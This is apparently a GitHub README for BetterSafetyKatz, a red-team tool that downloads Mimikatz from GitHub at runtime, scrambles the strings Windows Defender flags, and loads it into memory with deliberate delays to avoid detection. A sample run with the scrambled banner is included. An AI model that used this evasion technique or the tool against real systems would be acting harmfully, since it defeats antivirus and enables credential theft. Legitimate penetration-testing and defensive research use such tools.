# BetterSafetyKatz?

This modified fork of SafetyKatz dynamically fetches the latest pre-compiled release of Mimikatz directly from the gentilkiwi GitHub repo, 
runtime patching on detected signatures and uses @subtee's PE Loader to get it into memory.

1. Gets the URL for the latest ZIP / PreCompiled Mimikatz binary directly from GitHub Repo
2. Unzipped in memory, turned into HEX. Then strings/signatures detected by Windows Defender are replaced with random strings of the same size 
    (Used https://github.com/matterpreter/DefenderCheck to gather signatures detected)
3. PE-Loaded into mem using @subtee POC (Added delays between mapping of DLLs-> Functions , Windows Defender thought it was to fast..)

Stolen from @harmj0y, @subtee and @gentilkiwi, repurposed by @Flangvik and @Mrtn9

[@harmj0y](https://twitter.com/harmj0y) is the primary author of the port that this repo is forked from.

BetterSafetyKatz is licensed under the BSD 3-Clause license.

## Usage

    PS D:\Projects\BetterSafetyKatz\BetterSafetyKatz\bin\Debug> .\BetterSafetyKatz.exe                                                      
	
	[+] Stolen from @harmj0y, @subtee and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
	[+] Contacting gentilkiwi -> https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200502/mimikatz_trunk.zip
	[+] Randomizing strings in memory
	[+] Mapping DLL Ptrs into memory, but doing it sloooooowly (10 sec tops)
	[+] Executing loaded Mimikatz PE

	  .#####.   I7HC7OQ4 2.2.0 (x64) #18362 May  2 2020 16:23:51
	 .## ^ ##.  "CY76SIXX8WBAQF6XOOD" - (WMW0I)
	 ## / \ ##  /*** 1JKD5SDQM0EOSP `XGOPX1Y6CK` ( S9NK2HO6@XGOPX1Y6CK.com )
	 ## \ / ##       > http://blog.XGOPX1Y6CK.com/I7HC7OQ4
	 '## v ##'       P26TMNHP22ZGVUF             ( 45F6XVOMFTRJL6BXRNB86A5W )
	  '#####'        > KMPG3ATJL9YDWTE9SYW0Z / D14BS2FKVSL0DZA4VOONS7K   ***/

	I7HC7OQ4 # coffee

		( (
		 ) )
	  .______.
	  |      |]
	  \      /
	   `----'

	I7HC7OQ4 #


